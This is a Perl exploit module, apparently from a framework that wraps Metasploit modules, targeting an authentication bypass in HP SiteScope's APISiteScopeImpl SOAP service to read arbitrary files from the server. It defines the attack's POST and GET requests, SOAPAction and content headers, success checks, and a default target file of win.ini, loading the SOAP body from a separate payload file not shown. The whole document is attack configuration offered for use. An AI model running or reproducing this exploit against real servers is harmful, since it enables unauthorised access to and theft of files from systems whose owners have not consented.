package HP::MSF::HpSitescopeGetfileinternalFileaccess;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpSitescopeGetfileinternalFileaccess";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits an authentication bypass vulnerability in HP SiteScope to

        retrieve an arbitrary file from the remote server. It is accomplished by calling

        the getFileInternal operation available through the APISiteScopeImpl AXIS service.

        This module has been successfully tested on HP SiteScope 11.20 over Windows 2003

        SP2 and Linux Centos 6.3.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "hp_sitescope_getfileinternal_fileaccess",
  OSVDB       => 85119,
  PATH        => "__\\\@URI__services/APISiteScopeImpl?",
  PATHS       => [
                   "__\\\@URI__services/APISiteScopeImpl",
                   "__\\\@URI__services/APISiteScopeImpl",
                   "SiteScope/",
                 ],
  PAYLOAD     => "",
  TITLE       => "HP SiteScope SOAP Call getFileInternal Remote File Access",
  VARIABLES => {
    'HOST_NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'RFILE' =>       { DESCRIPTION => "Remote File", VALUE => "c:\\\\windows\\\\win.ini" },
    'PATH' =>       { DESCRIPTION => "Path to SiteScope", VALUE => "/SiteScope/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'services/APISiteScopeImpl',
      PAYLOAD      => read_file('MSFExploits/HP/MSF/src/HpSitescopeGetfileinternalFileaccess.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /services/APISiteScopeImpl',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
